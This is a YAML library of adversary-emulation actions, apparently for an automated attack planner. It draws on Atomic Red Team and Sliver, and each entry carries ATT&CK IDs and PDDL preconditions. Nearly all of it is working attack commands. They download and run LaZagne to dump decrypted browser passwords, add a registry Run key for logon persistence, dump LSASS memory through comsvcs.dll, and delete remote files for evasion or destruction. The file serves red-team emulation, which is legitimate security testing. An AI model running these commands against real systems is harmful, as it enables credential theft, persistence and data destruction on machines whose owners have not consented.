  - uuid: art-t1555_003-lazagne-browsers
    name: LaZagne - Credentials from Browser
    id:
      - T1555.003
    source: Atomic Red Team
    supported_platforms:
      - windows
    tactics:
      - Credential Access
    technique:
      - 'Credentials from Password Stores: Web Browsers'
    description: |
      LaZagne is a cross-platform credential harvester that reads and
      decrypts browser-stored passwords (Chrome, Firefox, IE/Edge, etc.).
      The `browsers` module dumps decrypted plaintext credentials to
      stdout. Method 3 folds the ART prereq (download LaZagne.exe v2.4.5
      release binary). ART auto_generated_guid
      9a2915b3-3954-4cce-8c76-00fbf4dbd014.
    execution:
      executor: Powershell Executor
      command: |
        $lazagne = "#{lazagne_path}"
        if (-not (Test-Path $lazagne)) {
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          New-Item -ItemType Directory (Split-Path $lazagne) -Force | Out-Null
          Invoke-WebRequest "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe" -OutFile $lazagne
        }
        & $lazagne browsers
    arguments:
      executor:
        description: The Powershell session ID used to invoke LaZagne.
        required: true
        pddl_index: executor4_var_in_plan
      lazagne_path:
        default: C:\Users\Public\LaZagne.exe
        description: Target-side path where LaZagne is staged and invoked.
        required: true
    preconditions:
      - (os-windows ?target - host)
      - (powershell ?executorID - executor ?target - host)
      - (elevated-executor ?executorID - executor)
    effects:
      - (credential-data ?d - data ?target - host)
      - (data-stored-c2 ?d - data)
  - uuid: art-t1547_001-reg-key-run
    name: Reg Key Run
    id:
      - T1547.001
    source: Atomic Red Team
    supported_platforms:
      - windows
    tactics:
      - Persistence
    technique:
      - 'Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder'
    description: |
      Adds a value to the `HKCU\...\CurrentVersion\Run` registry key so a
      chosen command runs whenever the current user logs in. Classic user-
      scope autorun; unelevated, survives reboot. ART auto_generated_guid
      e55be3fd-3521-4610-9d1a-e210e42dcf05.
    execution:
      executor: Command Prompt Executor
      command: |
        REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "#{value_name}" /t REG_SZ /F /D "#{command_to_execute}"
    arguments:
      executor:
        description: The Command Prompt session ID used to invoke reg add.
        required: true
        pddl_index: executor3_var_in_plan
      value_name:
        default: Atomic Red Team
        description: Registry value name under Run key.
        required: true
      command_to_execute:
        default: C:\Users\Public\payload.exe
        description: Command / path to execute at next user logon.
        required: true
        pddl_index: string3_var_in_plan
    preconditions:
      - (os-windows ?target - host)
      - (command-prompt ?executorID - executor ?target - host)
    effects:
      - (command-execution-at-startup ?c - string ?target - host)
  - uuid: art-t1003_001-comsvcs-minidump
    name: Dump LSASS.exe Memory using comsvcs.dll
    id:
      - T1003.001
    source: Atomic Red Team
    supported_platforms:
      - windows
    tactics:
      - Credential Access
    technique:
      - 'OS Credential Dumping: LSASS Memory'
    description: |
      Uses the built-in `comsvcs.dll` MiniDump export to write lsass.exe
      memory to disk — pure LOLBAS, no external binary needed. Windows
      native; no prereq to stage. ART auto_generated_guid
      2536dee2-12fb-459a-8c37-971844fa73be.
    execution:
      executor: Powershell Executor
      command: |
        C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id "#{output_file}" full
    arguments:
      executor:
        description: The Powershell session ID used to invoke rundll32 → comsvcs.
        required: true
        pddl_index: executor4_var_in_plan
      output_file:
        default: C:\Users\Public\lsass-comsvcs.dmp
        description: Target-side path for the resulting LSASS memory dump.
        required: true
        pddl_index: string1_var_in_plan
    preconditions:
      - (os-windows ?target - host)
      - (powershell ?executorID - executor ?target - host)
      - (elevated-executor ?executorID - executor)
    effects:
      - (file-exists ?path - string ?f - file ?target - host)
      - (lsass-dump-file ?f - file)
      - (callback-covered ?f - file)
  - uuid: sliver-rm
    name: Remove Remote Path
    id:
      - T1070.004
      - T1485
    source: Sliver
    supported_platforms:
      - windows
      - linux
      - macos
    tactics:
      - Defense Evasion
      - Impact
    technique:
      - |
        Indicator Removal: File Deletion
      - Data Destruction
    description: The `rm(remote_path, recursive=False, force=False)` command removes
      a directory or file(s) from the remote system. Parameters include remote_path
      (remote path), recursive (recursively remove file(s)), and force (forcefully
      remove the file(s)).
    execution:
      executor: Sliver Executor
      command: |
        rm(session_id=#{executor}, remote_path=#{RemotePath}, recursive=#{Recursive}, force=#{Force})
    arguments:
      executor:
        description: The session ID of the active Sliver connection.
        required: true
        pddl_index: executor1_var_in_plan
      RemotePath:
        description: Remote path
        required: true
        pddl_index: string1_var_in_plan
      Recursive:
        description: Recursively remove file(s)
        required: true
      Force:
        description: Forcefully remove the file(s)
        required: true
    preconditions:
      - operator: or
        operands:
          - (os-windows ?target - host)
          - (os-linux ?target - host)
          - (os-macos ?target - host)
      - (sliver-session ?executorID - executor ?target - host)
      - (file-exists ?path - string ?f - file ?target - host)
    effects:
      - (file-deleted ?f - file ?target - host)
